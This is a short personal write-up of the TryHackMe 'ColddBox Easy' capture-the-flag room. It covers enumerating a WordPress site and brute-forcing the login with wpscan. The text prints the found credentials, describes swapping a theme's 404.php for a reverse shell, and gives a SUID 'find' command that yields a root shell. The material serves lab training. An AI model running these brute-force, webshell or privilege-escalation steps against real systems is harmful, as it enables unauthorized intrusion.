#wordpress

https://tryhackme.com/r/room/colddboxeasy

---
#### Nmap
![[Screenshot_2024-05-27_18-07-39.png]]

#### Enumeration

![[Screenshot_2024-05-27_18-34-23.png]]

The directories enumeration gave me a `/hidden` place where there are some usernames:
```text
# U-R-G-E-N-T

## C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```

I put the 3 names in a wordlist and I used `wpscan` to bruteforce
```shell
wpscan --url http://10.10.65.39 -P /usr/share/wordlists/rockyou.txt -U users.txt --api-token [token]
```

The wp credentials are `c0ldd:9876543210`

When logged in, I went to `Appearance > Editor` and I replaced the `404.php` by a reverse shell

Then I went on the following url to trigger it
```text
http://10.10.65.39/wp-content/themes/twentyfifteen/404.php
```

And here I am in

I used `linpeas` to enumerate the system and the solution is `find`with the SUID bit:
```shell
find . -exec /bin/sh -p \; -quit
```

And here I am root